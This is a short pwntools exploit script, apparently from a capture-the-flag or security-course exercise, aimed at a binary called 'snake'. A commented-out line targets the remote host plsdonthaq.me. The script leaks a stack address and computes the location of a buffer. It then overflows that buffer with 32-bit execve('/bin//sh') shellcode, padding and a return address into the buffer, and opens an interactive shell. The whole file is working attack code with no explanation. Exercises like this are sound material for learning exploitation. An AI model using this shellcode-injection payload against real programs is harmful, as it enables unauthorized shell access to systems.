from pwn import *

context.terminal = 'qterminal'

#p = remote('plsdonthaq.me', 4002)
p = process('./snake')

#gdb.attach(p, ''' break get_name''')

p.recvuntil('> ')
p.sendline('3')

p.sendline(b'A'*0x50)

p.recvuntil('at offset ')
read_option_ebp_0xc = int(p.recvline().rstrip(), 16)
read_option_ebp = read_option_ebp_0xc + 0xC
read_option_esp = read_option_ebp - 0x70 # 0x70 is size of stack frame
get_name_ebp = read_option_esp - 0x8 # account for push eip and push ebp
get_name_buffer = get_name_ebp - 0x32 # buffer is at ebp-0x32

p.sendline('1')

shellcode = asm(""" xor eax, eax
					xor ecx, ecx
					xor edx, edx
					push ecx
					push 0x68732f2f
					push 0x6e69622f
					mov al, 0x0b
					mov ebx, esp
					int 0x80 """)

padding = b'A'*(0x32 + 0x4 - len(shellcode)) # from ebp-0x32 to ebp+0x4
bof_payload = shellcode + padding + p32(get_name_buffer)
print(hex(get_name_buffer))

p.sendline(bof_payload)

p.interactive()
